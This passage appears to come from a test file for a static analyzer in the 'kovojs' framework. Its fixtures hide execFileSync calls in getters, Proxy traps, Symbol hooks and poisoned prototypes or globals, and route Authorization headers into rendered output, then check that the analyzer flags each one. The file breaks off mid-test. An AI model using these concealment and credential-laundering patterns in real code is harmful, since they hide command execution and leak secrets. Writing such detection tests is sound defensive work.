        return callable;
      } });
      query({ load() { return function unsupported() {}; } });
      query({ load() { return class Unsupported {}; } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
        expect.objectContaining({ sink: 'client-wire.request.opaque-value' }),
      ]),
    );
  });

  it('executes module-scope getters reached through object destructuring, rest, and spread', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      const source = {
        get nested() {
          execFileSync('outer-getter');
          return { get value() { execFileSync('nested-getter'); return 'ok'; } };
        },
        get token() { execFileSync('token-getter'); return 'token'; },
      };
      query({ load() {
        const { token: alias } = source;
        const { ['token']: computed } = source;
        const { nested: { value = 'fallback' } } = source;
        const { ...rest } = source;
        let assigned;
        ({ token: assigned } = source);
        const copied = { ...source };
        return { alias, assigned, computed, copied, rest, value };
      } });
    `);

    const sources = facts
      .filter((fact) => fact.sink === 'child_process.execFileSync')
      .map((fact) => fact.source);
    expect(sources, JSON.stringify(facts)).toEqual(
      expect.arrayContaining(["'nested-getter'", "'outer-getter'", "'token-getter'"]),
    );
  });

  it('closes implicit coercion, iteration, await, symbol dispatch, tags, and disposal hooks', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      const protocols = {
        [Symbol.dispose]() { execFileSync('dispose-hook'); },
        [Symbol.hasInstance]() { execFileSync('has-instance-hook'); return false; },
        [Symbol.iterator]() { execFileSync('iterator-hook'); return [1][Symbol.iterator](); },
        [Symbol.replace]() { execFileSync('replace-hook'); return 'replaced'; },
        [Symbol.toPrimitive]() { execFileSync('coercion-hook'); return 'value'; },
        then(resolve) { execFileSync('then-hook'); resolve('ok'); },
      };
      function tag() { execFileSync('tag-hook'); return 'tagged'; }
      query({ async load() {
        void protocols + '';
        void (protocols == 1);
        void (protocols < 1);
        void ({} instanceof protocols);
        void \`value:\${protocols}\`;
        void tag\`value\`;
        const [first] = protocols;
        for (const value of protocols) void value;
        await protocols;
        using resource = protocols;
        return 'x'.replace(protocols, String(first));
      } });
    `);

    const sources = facts
      .filter((fact) => fact.sink === 'child_process.execFileSync')
      .map((fact) => fact.source);
    expect(sources, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        "'coercion-hook'",
        "'dispose-hook'",
        "'has-instance-hook'",
        "'iterator-hook'",
        "'replace-hook'",
        "'tag-hook'",
        "'then-hook'",
      ]),
    );
  });

  it('fails closed for request operations on authored proxies while traversing traps', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      const proxy = new Proxy({}, {
        get(target, key) { execFileSync('proxy-get'); return Reflect.get(target, key); },
        ownKeys(target) { execFileSync('proxy-own-keys'); return Reflect.ownKeys(target); },
        set(target, key, value) { execFileSync('proxy-set'); return Reflect.set(target, key, value); },
      });
      query({ load() {
        proxy.value = proxy.value;
        const { ...rest } = proxy;
        return { ...rest };
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'request-handler.opaque-protocol' }),
        expect.objectContaining({ sink: 'child_process.execFileSync', source: "'proxy-get'" }),
        expect.objectContaining({ sink: 'child_process.execFileSync', source: "'proxy-own-keys'" }),
        expect.objectContaining({ sink: 'child_process.execFileSync', source: "'proxy-set'" }),
      ]),
    );
  });

  it.each([
    ['object spread', 'return { ...dangerous };', 'proxy-object-spread'],
    [
      'object rest destructuring',
      'const { ...result } = dangerous; return result;',
      'proxy-object-rest',
    ],
    ['Object.assign source', 'return Object.assign({}, dangerous);', 'proxy-object-assign'],
    ['JSON.stringify', 'return JSON.stringify(dangerous);', 'proxy-json-stringify'],
    ['Response.json', 'return Response.json(dangerous);', 'proxy-response-json'],
  ])('traverses process Proxy traps through %s', (_label, operation, marker) => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      const dangerous = new Proxy({ value: 'safe' }, {
        get(target, key, receiver) {
          if (key === 'toJSON') execFileSync('${marker}');
          return Reflect.get(target, key, receiver);
        },
        ownKeys(target) {
          execFileSync('${marker}');
          return Reflect.ownKeys(target);
        },
      });
      query({ load() { ${operation} } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: `'${marker}'`,
        }),
      ]),
    );
  });

  it('fails closed before process Proxy traps can reach querystring.stringify', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import querystring from 'node:querystring';
      import { query } from '@kovojs/server';
      const dangerous = new Proxy({ value: 'safe' }, {
        ownKeys(target) {
          execFileSync('proxy-querystring-stringify');
          return Reflect.ownKeys(target);
        },
      });
      query({ load() { return querystring.stringify(dangerous); } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'node:querystring.stringify',
          source: 'dangerous',
        }),
      ]),
    );
  });

  it('traverses authored iterators used by destructuring assignment', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      const dangerousIterable = {
        [Symbol.iterator]() {
          execFileSync('destructuring-assignment-iterator');
          return ['safe'][Symbol.iterator]();
        },
      };
      query({ load() {
        let value;
        [value] = dangerousIterable;
        return value;
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: "'destructuring-assignment-iterator'",
        }),
      ]),
    );
  });

  it('fails closed before a mutable querystring.escape replacement can run', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import querystring from 'node:querystring';
      import { query } from '@kovojs/server';
      const originalEscape = querystring.escape;
      querystring.escape = (value) => {
        execFileSync('querystring-escape-replacement');
        return originalEscape(value);
      };
      query({ load(input) {
        return querystring.stringify({ value: input.value });
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'node:querystring.stringify',
        }),
      ]),
    );
  });

  it('closes input prototype laundering through a Proxy before input.toString()', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      const dangerousPrototype = new Proxy(Object.prototype, {
        get(target, key, receiver) {
          if (key === 'toString') {
            return () => {
              execFileSync('input-prototype-proxy');
              return 'safe';
            };
          }
          return Reflect.get(target, key, receiver);
        },
      });
      query({ load(input) {
        Object.setPrototypeOf(input, dangerousPrototype);
        return input.toString();
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: "'input-prototype-proxy'",
        }),
      ]),
    );
  });

  it('does not admit console.log after an opaque helper can poison console output', () => {
    const facts = sinksFor(`
      import { poisonConsole } from 'opaque-console-poison';
      import { query } from '@kovojs/server';
      query({ load() {
        poisonConsole(console);
        console.log('safe');
        return 'safe';
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-call',
          source: 'console.log',
        }),
      ]),
    );
  });

  it('keeps reviewed primitive and plain-array implicit protocols open', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      query({ async load(input) {
        const values = [input.value, 'safe'];
        const copied = [...values];
        const [first] = copied;
        for (const value of copied) void String(value);
        await Promise.resolve(first);
        const settled = await new Promise((resolve) => resolve('ok'));
        return \`value:\${first}:\${settled}\`;
      } });
    `);

    expect(facts.filter((fact) => fact.sink === 'request-handler.opaque-protocol')).toEqual([]);
  });

  it('keeps aliased plain-array spread open', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      query({ load(input) {
        const values = [input.value, 'safe'];
        const alias = values;
        const copied = [...alias];
        return copied;
      } });
    `);

    expect(facts).toEqual([]);
  });

  it('keeps local generator spread open', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      function* values(value) {
        yield value;
        yield 'safe';
      }
      query({ load(input) {
        return [...values(input.value)];
      } });
    `);

    expect(facts).toEqual([]);
  });

  it('keeps a plain Promise.resolve(...).then projection open', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      query({ async load() {
        return await Promise.resolve('safe').then((value) => value);
      } });
    `);

    expect(facts).toEqual([]);
  });

  it('rejects inherited, constructor-coercion, and async-assimilation protocol escapes', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      const inherited = Object.create({
        toString() { execFileSync('inherited-coercion'); return '/path'; },
      });
      async function assimilated() {
        return { then(resolve) { execFileSync('async-assimilation'); resolve('ok'); } };
      }
      query({ async load() {
        void \`value:\${inherited}\`;
        void new URL(inherited, 'https://example.test').href;
        await assimilated();
        return 'ok';
      } });
    `);

    const sources = facts
      .filter((fact) => fact.sink === 'child_process.execFileSync')
      .map((fact) => fact.source);
    expect(sources, JSON.stringify(facts)).toEqual(
      expect.arrayContaining(["'async-assimilation'", "'inherited-coercion'"]),
    );
  });

  it('preserves credential provenance through getter-backed destructuring projections', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      let current;
      const source = {
        get nested() { return { get token() { return current.headers.get('authorization'); } }; },
        get token() { return current.headers.get('authorization'); },
      };
      query({ load(_input, { request }) {
        current = request;
        const { token: alias } = source;
        const { nested: { token: nested } } = source;
        let assigned;
        ({ token: assigned } = source);
        return { alias, assigned, nested };
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
      ]),
    );
  });

  it('closes mutated intrinsic prototypes while preserving local intrinsic helpers', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      String.prototype.trim = function() { execFileSync('trim-rebind'); return String(this); };
      Object.defineProperty(Array.prototype, 'map', {
        value() { execFileSync('map-rebind'); return []; },
      });
      query({ load(input) {
        String(input.program).trim();
        [input.program].map((value) => value);
        return 'ok';
      } });
    `);
    const sources = facts
      .filter((fact) => fact.sink === 'child_process.execFileSync')
      .map((fact) => fact.source);
    expect(sources).toEqual(expect.arrayContaining(["'map-rebind'", "'trim-rebind'"]));

    const safe = sinksFor(`
      import { query } from '@kovojs/server';
      function trim(value) { return value.trim(); }
      query({ load(input) { return trim(input.value); } });
    `);
    expect(safe.map((fact) => fact.sink)).not.toContain('request-handler.opaque-call');
  });

  it.each([
    'Set',
    'Map',
    'Object',
    'ReadableStream',
    'TextEncoder',
    'SubtleCrypto',
    'atob',
    'btoa',
    'fetch',
    'globalThis',
  ])(
    'rejects a bare reassignment of locked global %s without requiring a later intrinsic use',
    (globalName) => {
      const facts = sinksFor(`
        const replacement = class Replacement {};
        ${globalName} = replacement;
      `);
      expect(facts, `${globalName}: ${JSON.stringify(facts)}`).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            sink: 'request-handler.opaque-protocol',
            source: `<global-binding-setter:${globalName}>`,
          }),
        ]),
      );
    },
  );

  it.each([
    ['compound assignment', 'Set ||= PoisonSet;'],
    ['prefix update', '++Set;'],
    ['postfix update', 'Set++;'],
    ['delete', 'delete Set;'],
    ['array assignment pattern', '[Set] = [PoisonSet];'],
    ['object assignment pattern', '({ value: Set } = { value: PoisonSet });'],
    ['object shorthand assignment pattern', '({ Set } = { Set: PoisonSet });'],
    ['object shorthand default assignment pattern', '({ Set = PoisonSet } = {});'],
    ['for-of assignment target', 'for (Set of [PoisonSet]) break;'],
    ['for-in assignment target', 'for (Set in { PoisonSet: 1 }) break;'],
    ['for-of shorthand assignment target', 'for ({ Set } of [{ Set: PoisonSet }]) break;'],
    ['for-of shorthand default assignment target', 'for ({ Set = PoisonSet } of [{}]) break;'],
    ['for-in shorthand assignment target', 'for ({ Set } in { PoisonSet: 1 }) break;'],
  ])('rejects a locked global through %s', (_label, mutation) => {
    const facts = sinksFor(`
      const NativeSet = Set;
      class PoisonSet extends NativeSet {}
      ${mutation}
    `);
    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-protocol',
          source: '<global-binding-setter:Set>',
        }),
      ]),
    );
  });

  it('preserves shadowed local bindings that share locked-global names', () => {
    const facts = sinksFor(`
      {
        let Set = 1;
        let TextEncoder = 2;
        let atob = 3;
        Set = 4;
        TextEncoder++;
        [atob] = [5];
        ({ Set } = { Set: 6 });
        ({ Set = 7 } = {});
        for ({ Set } of [{ Set: 8 }]) break;
        for ({ Set = 9 } of [{}]) break;
      }
    `);
    expect(facts).toEqual([]);
  });

  it.each([
    ['declare var', 'declare var Set: typeof NativeSet;'],
    ['declare let', 'declare let Set: typeof NativeSet;'],
    ['declare const', 'declare const Set: typeof NativeSet;'],
    ['export declare var', 'export declare var Set: typeof NativeSet;'],
    ['declare function', 'declare function Set(value?: unknown): void;'],
    ['overload-only function', 'function Set(value?: unknown): void;'],
    ['declare class', 'declare class Set {}'],
    ['declare enum', 'declare enum Set { Value }'],
    ['declare namespace', 'declare namespace Set {}'],
    ['interface', 'interface Set {}'],
    ['type alias', 'type Set = unknown;'],
    ['type-only import', "import type { Set } from './types.js';"],
    ['type-only namespace import', "import type * as Set from './types.js';"],
    ['type-only import equals', "import type Set = require('./types.js');"],
  ])('treats erased %s bindings as non-shadowing global assignments', (_label, declaration) => {
    const source = `
      const NativeSet = globalThis.Set;
      class PoisonSet extends NativeSet {}
      ${declaration}
      Set = PoisonSet;
    `;
    const emitted = ts.transpileModule(source, {
      compilerOptions: { module: ts.ModuleKind.ESNext, target: ts.ScriptTarget.ES2022 },
    }).outputText;
    expect(emitted).toMatch(/Set\s*=\s*PoisonSet/u);
    expect(sinksFor(source)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-protocol',
          source: '<global-binding-setter:Set>',
        }),
      ]),
    );
  });

  it('treats declare-global bindings as erased for direct and shorthand assignment targets', () => {
    const source = `
      export {};
      const NativeSet = globalThis.Set;
      class PoisonSet extends NativeSet {}
      declare global { var Set: typeof NativeSet; }
      Set = PoisonSet;
      ({ Set } = { Set: PoisonSet });
      for ({ Set = PoisonSet } of [{}]) break;
    `;
    const emitted = ts.transpileModule(source, {
      compilerOptions: { module: ts.ModuleKind.ESNext, target: ts.ScriptTarget.ES2022 },
    }).outputText;
    expect(emitted).toMatch(/Set\s*=\s*PoisonSet/u);
    expect(
      sinksFor(source).filter((fact) => fact.source === '<global-binding-setter:Set>'),
    ).toHaveLength(3);
  });

  it('keeps ambient eval visible while preserving a genuine emitted local shadow', () => {
    const ambient = `
      declare const eval: (source: string) => unknown;
      eval(input);
    `;
    const emitted = ts.transpileModule(ambient, {
      compilerOptions: { module: ts.ModuleKind.ESNext, target: ts.ScriptTarget.ES2022 },
    }).outputText;
    expect(emitted).toContain('eval(input)');
    expect(sinksFor(ambient)).toEqual(
      expect.arrayContaining([expect.objectContaining({ sink: 'eval', source: 'input' })]),
    );

    expect(
      sinksFor(`
        {
          const eval = (source: string) => source;
          eval(input);
          let Set = class LocalSet {};
          Set = class ReplacementSet {};
        }
      `),
    ).toEqual([]);

    const runtimeNamespace = sinksFor(`
      import * as Set from './runtime.js';
      Set = class ReplacementSet {};
    `);
    expect(runtimeNamespace).not.toEqual(
      expect.arrayContaining([expect.objectContaining({ source: '<global-binding-setter:Set>' })]),
    );
  });

  it('keeps exact component-input JSON array callbacks off the public wire', () => {
    const facts = sinksFor(`
      import { component } from '@kovojs/core';
      import { createApp, route } from '@kovojs/server';
      const ContactList = component({
        render: ({ items }) => <ul>{items.map(() => <li>contact</li>)}</ul>,
      });
      export default createApp({
        routes: [route('/', { page: () => <ContactList /> })],
      });
    `);
    expect(facts).toEqual([]);
  });

  it.each(['of [PoisonSet]', 'in { PoisonSet: 1 }'])(
    'traverses an authored setter used as a for-%s assignment target',
    (loopTail) => {
      const facts = sinksFor(`
        import { execFileSync } from 'node:child_process';
        const carrier = {
          set Set(value) { execFileSync('loop-property-setter'); void value; },
        };
        class PoisonSet extends Set {}
        for (carrier.Set ${loopTail}) break;
      `);
      expect(facts, JSON.stringify(facts)).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            sink: 'child_process.execFileSync',
            source: "'loop-property-setter'",
          }),
        ]),
      );
    },
  );

  it('closes pre-snapshot access-array push and index mutations', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { endpoint } from '@kovojs/server';
      const response = { appOwnedSafety: true, body: 'text', cache: 'no-store' };
      const pushed = [];
      pushed.push((request) => { execFileSync('access-push'); return request.url.length > 0; });
      endpoint('/push', { access: pushed, handler() { return new Response('ok'); }, method: 'GET', reason: 'push', response });
      const indexed = [];
      indexed[0] = (request) => { execFileSync('access-index'); return request.url.length > 0; };
      endpoint('/index', { access: indexed, handler() { return new Response('ok'); }, method: 'GET', reason: 'index', response });
    `);
    const sources = facts
      .filter((fact) => fact.sink === 'child_process.execFileSync')
      .map((fact) => fact.source);
    expect(sources).toEqual(expect.arrayContaining(["'access-index'", "'access-push'"]));
  });

  it.each([
    ['fill replacement', `access.fill(hostile);`],
    ['length weakening', `access.length = 0;`],
    ['reflective replacement', `Object.assign(access, { 0: hostile });`],
    ['reflective removal', `Reflect.deleteProperty(access, 0);`],
    [
      'ErrorBoundary identity result',
      `const alias = ErrorBoundary({ children: access as never, fallback: null }) as unknown as typeof access;
       alias[0] = hostile;`,
    ],
    [
      'publishToClient identity result',
      `const alias = publishToClient(access, { reason: 'public fixture' });
       alias[0] = hostile;`,
    ],
  ])('rejects retained access-array %s', (_label, mutation) => {
    const facts = sinksFor(`
      import { ErrorBoundary, publishToClient } from '@kovojs/core';
      import { execFileSync } from 'node:child_process';
      import { guards, route } from '@kovojs/server';
      const access = [guards.authed()];
      const hostile = () => { execFileSync('retained-access'); return true; };
      ${mutation}
      export const page = route('/x', {
        access,
        page() { return '<main>safe</main>'; },
      });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<mutated-retained-config>',
        }),
      ]),
    );
  });

  it('links cross-module helper caches to retained schema identities', () => {
    const facts = sinksForFiles([
      {
        fileName: 'factory.ts',
        source: `
          export let cached;
          export function makeOutput() {
            cached = { parse(value) { return value; } };
            return cached;
          }
        `,
      },
      {
        fileName: 'poison.ts',
        source: `
          import { cached } from './factory.js';
          export function poison() {
            cached.parse = (value) => value;
          }
        `,
      },
      {
        fileName: 'app.ts',
        source: `
          import { query } from '@kovojs/server';
          import { makeOutput } from './factory.js';
          import { poison } from './poison.js';
          const output = makeOutput();
          poison();
          export const read = query({
            output,
            load() { return { ok: true }; },
          });
        `,
      },
    ]);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<opaque-retained-config-derivation>',
        }),
      ]),
    );
  });

  it('accepts the finite literal and const-alias retained-config grammar', () => {
    const facts = sinksFor(`
      import { guards, query } from '@kovojs/server';
      const access = [guards.authed()];
      const schemas = {
        output: { parse(value) { return value; } },
      };
      const { output } = schemas;
      export const read = query({
        access,
        output,
        load() { return { ok: true }; },
      });
    `);

    expect(facts).toEqual([]);
  });

  it('treats only inert logical-not as a non-mutating retained-config unary use', () => {
    const source = (unary: string) => `
      import { guards, query } from '@kovojs/server';
      const access = [guards.authed()];
      ${unary}access;
      export const read = query({
        access,
        load() { return { ok: true }; },
      });
    `;
    expect(sinksFor(source('!'))).toEqual([]);
    for (const operator of ['+', '-', '~']) {
      const facts = sinksFor(source(operator));
      expect(facts, operator).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            sink: 'request-handler.opaque-source',
            source: '<mutated-retained-config>',
          }),
        ]),
      );
    }
  });

  it('accepts only the pristine generated contacts query key as an optimistic computed key', () => {
    const queryFile = {
      fileName: 'queries.ts',
      source: `
        import { query } from '@kovojs/server';
        export const contactsQuery = query({ load() { return { items: [] }; } });
      `,
    };
    const mutationSource = (computedKey: string, setup = '') => `
      import { mutation, publicAccess } from '@kovojs/server';
      import { contactsQuery } from './queries.js';
      ${setup}
      export const addContact = mutation({
        access: publicAccess('fixture'),
        registry: { queries: [contactsQuery] },
        optimistic: {
          [${computedKey}](draft, input) { draft.items.push(input); },
        },
        handler() { return { ok: true }; },
      });
    `;
    expect(
      sinksForFiles([
        queryFile,
        { fileName: 'mutations.ts', source: mutationSource('contactsQuery.key') },
        {
          fileName: 'components.ts',
          source: `
            import { component } from '@kovojs/core';
            import { contactsQuery } from './queries.js';
            export const Contacts = component({
              queries: { contacts: contactsQuery },
              render() { return null; },
            });
          `,
        },
        {
          fileName: 'app.ts',
          source: `
            import { createApp } from '@kovojs/server';
            import { contactsQuery } from './queries.js';
            export default createApp({ queries: [contactsQuery], routes: [] });
          `,
        },
      ]),
    ).toEqual([]);

    expect(
      sinksFor(`
        import { mutation, publicAccess, query } from '@kovojs/server';
        const phaseQuery = query({ load() { return { items: [] }; } });
        export const run = mutation({
          access: publicAccess('fixture'),
          optimistic: { [phaseQuery.key]: 'await-fragment' },
          handler() { return { ok: true }; },
        });
      `),
    ).toEqual([]);

    for (const [computedKey, setup] of [
      ['queryAlias.key', `const queryAlias = contactsQuery;`],
      [`contactsQuery[key]`, `const key = 'key';`],
      ['contactsQuery.key', `Object.defineProperty(contactsQuery, 'key', { value: 'attacker' });`],
    ] as const) {
      const facts = sinksForFiles([
        queryFile,
        { fileName: 'mutations.ts', source: mutationSource(computedKey, setup) },
      ]);
      if (setup.includes('Object.defineProperty')) {
        expect(facts, `${setup}\n${computedKey}`).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              sink: 'request-handler.opaque-protocol',
              source: '<Object.defineProperty-target:contactsQuery>',
            }),
          ]),
        );
        continue;
      }
      expect(facts, `${setup}\n${computedKey}`).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            sink: 'request-handler.opaque-source',
            source: '<opaque-retained-config-derivation>',
          }),
        ]),
      );
    }

    for (const setup of [
      `const queryAlias = contactsQuery;`,
      `const queryBox = { value: contactsQuery };`,
      `consume(contactsQuery);`,
    ]) {
      const facts = sinksForFiles([
        queryFile,
        {
          fileName: 'mutations.ts',
          source: mutationSource('contactsQuery.key', setup),
        },
      ]);
      expect(facts, setup).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            sink: 'request-handler.opaque-source',
            source: '<opaque-retained-config-derivation>',
          }),
        ]),
      );
    }

    const namespaceFacts = sinksForFiles([
      queryFile,
      {
        fileName: 'mutations.ts',
        source: mutationSource('queries.contactsQuery.key').replace(
          `import { contactsQuery } from './queries.js';`,
          `import * as queries from './queries.js';`,
        ),
      },
    ]);
    expect(namespaceFacts.length).toBeGreaterThan(0);
  });

  it('keeps component query arrays plain while preserving exact slot request provenance', () => {
    const safe = sinksFor(`
      /** @jsxImportSource @kovojs/server */
      import { trustedHtml, trustedUrl } from '@kovojs/browser';
      import { component } from '@kovojs/core';
      import { createApp, publicAccess, query, route } from '@kovojs/server';
      const contactsQuery = query({ load() { return { items: [] }; } });
      const defaultSlots = { forms: { add: { submitted: null } } };
      function submittedFieldValue(value) { return typeof value === 'string' ? value : ''; }
      function renderCard(contact) { return <li>{contact.email}</li>; }
      export const Proof = component({
        queries: { contacts: contactsQuery },
        render({ contacts }, _state, slots = defaultSlots) {
          const items = contacts.items;
          const submitted = slots.forms.add.submitted ?? {};
          submittedFieldValue(submitted.name);
          const href = items.map((contact) => contact.email).join('');
          return <main><a href={trustedUrl(href, 'reviewed contact URL')}>Contact</a><ul>{items.map((contact) => renderCard(contact))}</ul></main>;
        },
      });
      const HeaderProof = component({
        render(_data, _state, slots) {
          const proof = slots.request?.headers.get('x-proof') ?? '';
          return <aside>{trustedHtml(proof, 'reviewed proof header')}</aside>;
        },
      });
      export default createApp({
        queries: [contactsQuery],
        routes: [route('/', { access: publicAccess('fixture'), page() { return <><Proof /><HeaderProof /></>; } })],
      });
    `);
    expect(safe).toEqual([]);

    const crossFile = sinksForFiles([
      {
        fileName: 'component.tsx',
        source: `
          /** @jsxImportSource @kovojs/server */
          import { component } from '@kovojs/core';
          import { query } from '@kovojs/server';
          export const contactsQuery = query({ load() { return { items: [] }; } });
          function renderCard(contact) { return <li>{contact.email}</li>; }
          export const Proof = component({
            queries: { contacts: contactsQuery },
            render({ contacts }) {
              const items = contacts.items;
              return <ul>{items.map((contact) => renderCard(contact))}</ul>;
            },
          });
        `,
      },
      {
        fileName: 'app.tsx',
        source: `
          /** @jsxImportSource @kovojs/server */
          import { createApp, publicAccess, route } from '@kovojs/server';
          import { contactsQuery, Proof } from './component.js';
          export default createApp({
            queries: [contactsQuery],
            routes: [route('/', { access: publicAccess('fixture'), page() { return <Proof />; } })],
          });
        `,
      },
    ]);
    expect(crossFile).toEqual([]);

    const customSlotCredentialLeak = sinksFor(`
      /** @jsxImportSource @kovojs/server */
      import { component } from '@kovojs/core';
      import { publicAccess, route } from '@kovojs/server';
      const Proof = component({
        render(_data, _state, slots) {
          const headers = slots.headers as Headers;
          let authorization = '';
          headers.forEach((value, name) => {
            if (name.toLowerCase() === 'authorization') authorization = value;
          });
          return <main>{authorization}</main>;
        },
      });
      route('/', {
        access: publicAccess('fixture'),
        page(_context, request) { return <Proof headers={request.headers} />; },
      });
    `);
    expect(customSlotCredentialLeak, JSON.stringify(customSlotCredentialLeak)).toEqual(
      expect.arrayContaining([expect.objectContaining({ sink: 'client-wire.request.headers' })]),
    );

    const customPropCredentialLeak = sinksFor(`
      /** @jsxImportSource @kovojs/server */
      import { route } from '@kovojs/server';
      function Proof(data) {
        let authorization = '';
        data.headers.forEach((value, name) => {
          if (name.toLowerCase() === 'authorization') authorization = value;
        });
        return <main>{authorization}</main>;
      }
      route('/', {
        page(_context, request) { return <Proof headers={request.headers} />; },
      });
    `);
    expect(customPropCredentialLeak, JSON.stringify(customPropCredentialLeak)).toEqual(
      expect.arrayContaining([expect.objectContaining({ sink: 'client-wire.request.headers' })]),
    );

    for (const { invocation, render } of [
      {
        invocation: '<Proof headers={request.headers} />',
        render: `render({ headers }) {
          let authorization = '';
          headers.forEach((value, name) => {
            if (name.toLowerCase() === 'authorization') authorization = value;
          });
          return <main>{authorization}</main>;
        }`,
      },
      {
        invocation: '<Proof bag={{ headers: request.headers }} />',
        render: `render(data) {
          let authorization = '';
          data.bag.headers.forEach((value, name) => {
            if (name.toLowerCase() === 'authorization') authorization = value;
          });
          return <main>{authorization}</main>;
        }`,
      },
      {
        invocation: '<Proof bag={{ headers: request.headers }} />',
        render: `render(data) {
          const bag = data.bag;
          let authorization = '';
          bag.headers.forEach((value, name) => {
            if (name.toLowerCase() === 'authorization') authorization = value;
          });
          return <main>{authorization}</main>;
        }`,
      },
    ]) {
      const facts = sinksFor(`
        /** @jsxImportSource @kovojs/server */
        import { component } from '@kovojs/core';
        import { route } from '@kovojs/server';
        const Proof = component({ ${render} });
        route('/', {
          page(_context, request) { return ${invocation}; },
        });
      `);
      expect(facts, `${render}\n${JSON.stringify(facts)}`).toEqual(
        expect.arrayContaining([expect.objectContaining({ sink: 'client-wire.request.headers' })]),
      );
    }

    for (const { invocation, render } of [
      {
        invocation: '<Proof headers={request.headers} />',
        render: `render(data) {
          const key = 'headers';
          let authorization = '';
          data[key].forEach((value, name) => {
            if (name.toLowerCase() === 'authorization') authorization = value;
          });
          return <main>{authorization}</main>;
        }`,
      },
      {
        invocation: '<Proof bag={{ headers: request.headers }} />',
        render: `render(data) {
          const key = 'headers';
          let authorization = '';
          data.bag[key].forEach((value, name) => {
            if (name.toLowerCase() === 'authorization') authorization = value;
          });
          return <main>{authorization}</main>;
        }`,
      },
      {
        invocation: '<Proof key="headers" headers={request.headers} />',
        render: `render(data) {
          let authorization = '';
          data[data.key].forEach((value, name) => {
            if (name.toLowerCase() === 'authorization') authorization = value;
          });
          return <main>{authorization}</main>;
        }`,
      },
    ]) {
      const facts = sinksFor(`
        /** @jsxImportSource @kovojs/server */
        import { component } from '@kovojs/core';
        import { route } from '@kovojs/server';
        const Proof = component({ ${render} });
        route('/', {
          page(_context, request) { return ${invocation}; },
        });
      `);
      expect(facts, `${render}\n${JSON.stringify(facts)}`).toEqual(
        expect.arrayContaining([expect.objectContaining({ sink: 'client-wire.request.headers' })]),
      );
    }

    const deepMembers = Array.from({ length: 65 }, (_unused, index) => `p${index}`);
    const deepProp = deepMembers.reduceRight(
      (value, member) => `{ ${member}: ${value} }`,
      'request.headers',
    );
    const deepComponentFacts = sinksFor(`
      /** @jsxImportSource @kovojs/server */
      import { component } from '@kovojs/core';
      import { route } from '@kovojs/server';
      const Proof = component({
        render(data) {
          let authorization = '';
          data.bag.${deepMembers.join('.')}.forEach((value, name) => {
            if (name.toLowerCase() === 'authorization') authorization = value;
          });
          return <main>{authorization}</main>;
        },
      });
      route('/', {
        page(_context, request) { return <Proof bag={${deepProp}} />; },
      });
    `);
    expect(deepComponentFacts, JSON.stringify(deepComponentFacts)).toEqual(
      expect.arrayContaining([expect.objectContaining({ sink: 'client-wire.request.headers' })]),
    );

    const componentAliases = Array.from(
      { length: 64 },
      (_unused, index) => `const alias${index} = ${index === 0 ? 'data' : `alias${index - 1}`};`,
    ).join('\n');
    const aliasedComponentFacts = sinksFor(`
      /** @jsxImportSource @kovojs/server */
      import { component } from '@kovojs/core';
      import { route } from '@kovojs/server';
      const Proof = component({
        render(data) {
          ${componentAliases}
          let authorization = '';
          alias63.headers.forEach((value, name) => {
            if (name.toLowerCase() === 'authorization') authorization = value;
          });
          return <main>{authorization}</main>;
        },
      });
      route('/', {
